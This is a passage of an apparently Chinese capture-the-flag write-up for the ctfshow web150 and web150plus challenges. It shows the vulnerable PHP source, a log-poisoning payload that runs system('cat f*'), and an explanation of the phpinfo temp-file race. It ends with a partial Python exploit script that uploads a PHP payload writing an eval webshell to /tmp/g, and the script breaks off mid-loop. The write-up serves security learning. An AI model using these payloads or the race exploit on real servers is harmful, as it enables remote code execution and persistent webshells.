</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#过滤字符
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入</p>
<p><img alt="image-20250124231951262" loading="lazy" src="assets/image-20250124231951262.png"></p>
<p>或者</p>
<p><img alt="image-20250126151004338" loading="lazy" src="./assets/image-20250126151004338.png"></p>
<p>把马写到日志里</p>
<p>payload:</p>
<pre tabindex="0"><code>GET ?isVIP=true&amp;1=system(&#39;cat f*&#39;);
POST ctf=/var/log/nginx/access.log
</code></pre><h4 id="web150plus">web150plus<a hidden class="anchor" aria-hidden="true" href="#web150plus">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#过滤字符
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">class_exists</span><span class="p">(</span><span class="nv">$__CTFSHOW__</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;class is exists!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$isVIP</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span> <span class="o">&amp;&amp;</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">,</span><span class="s2">&#34;log&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$ctf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了非预期解 日志注入的方法</p>
<p>首先我们需要知道__autoload方法的作用</p>
<ul>
<li><code>__autoload()</code>：自动加载函数，当使用未定义的类时会自动调用该函数。如果<code>$class</code>变量已设置，则将其作为函数调用。</li>
</ul>
<p>而且这题的__autoload并不在类CTFSHOW中（障眼法）</p>
<p><img alt="image-20250126154119464" loading="lazy" src="./assets/image-20250126154119464.png"></p>
<p>这个类在isVIP后面已经结束了</p>
<p>所以我们可以通过</p>
<pre tabindex="0"><code>if(class_exists($__CTFSHOW__)){
    echo &#34;class is exists!&#34;;
}
</code></pre><p>调用任意的类</p>
<p>我们可以根据php会将.解析成_的特性绕过正则</p>
<pre tabindex="0"><code>GET ?..CTFSHOW..=phpinfo
</code></pre><p><img alt="image-20250126154411534" loading="lazy" src="./assets/image-20250126154411534.png"></p>
<p>由于原题需要竞争所以后面就直接把flag放环境变量了</p>
<p>这里我们直接在phpinfo里面找就行</p>
<p><strong>原题解法</strong>
拿到phpinfo我们就可以getshell了</p>
<blockquote>
<p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。
原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<blockquote>
<p>过程
1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
<p>2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
<p>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
<p>4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
<p>5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
<p>6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell</p>
<p>处理
PHP 对 enctype=&ldquo;multipart/form-data&quot;请求的处理过程如下：
1、请求到达；
2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容；
3、调用相应 PHP 脚本进行处理，如校验名称、大小等；
4、删除临时文件。
总结
php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门
原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902</p></blockquote>
<p>大佬的脚本，但是是python2的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="ch">#!/usr/bin/python </span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl"> 
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">    <span class="n">TAG</span><span class="o">=</span><span class="s2">&#34;Security Test&#34;</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl">    <span class="n">PAYLOAD</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;</span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="s2">&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">TAG</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="n">REQ1_DATA</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;-----------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="s2">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="s2">Content-Type: text/plain</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="s2">-----------------------------7dbff1ded0714--</span><span class="se">\r</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">PAYLOAD</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">    <span class="n">padding</span><span class="o">=</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">5000</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">    <span class="n">REQ1</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;POST /06/phpinfo.php?a=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34; HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="s2">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="s2">HTTP_ACCEPT: &#34;&#34;&#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="s2">HTTP_USER_AGENT: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="s2">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="s2">HTTP_PRAGMA: &#34;&#34;&#34;</span><span class="o">+</span><span class="n">padding</span><span class="o">+</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="s2">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="s2">Content-Length: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="s2"></span><span class="si">%s</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">REQ1_DATA</span><span class="p">),</span><span class="n">host</span><span class="p">,</span><span class="n">REQ1_DATA</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="c1">#modify this to suit the LFI script   </span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">    <span class="n">LFIREQ</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;GET /06/lfi.php?file=</span><span class="si">%s</span><span class="s2"> HTTP/1.1</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="s2">User-Agent: Mozilla/4.0</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="s2">Proxy-Connection: Keep-Alive</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="s2">Host: </span><span class="si">%s</span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">REQ1</span><span class="p">,</span> <span class="n">TAG</span><span class="p">,</span> <span class="n">LFIREQ</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="k">def</span> <span class="nf">phpInfoLFI</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfireq</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">        <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">        <span class="n">fn</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">17</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">31</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">lfireq</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">host</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">s2</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 59</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">    <span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">tag</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">        <span class="k">return</span> <span class="n">fn</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="n">counter</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="k">class</span> <span class="nc">ThreadWorker</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">e</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">lock</span> <span class="o">=</span>  <span class="n">l</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span> <span class="o">=</span> <span class="n">m</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">args</span> <span class="o">=</span> <span class="n">args</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">        <span class="k">global</span> <span class="n">counter</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">            <span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">lock</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">maxattempts</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                    <span class="k">return</span>
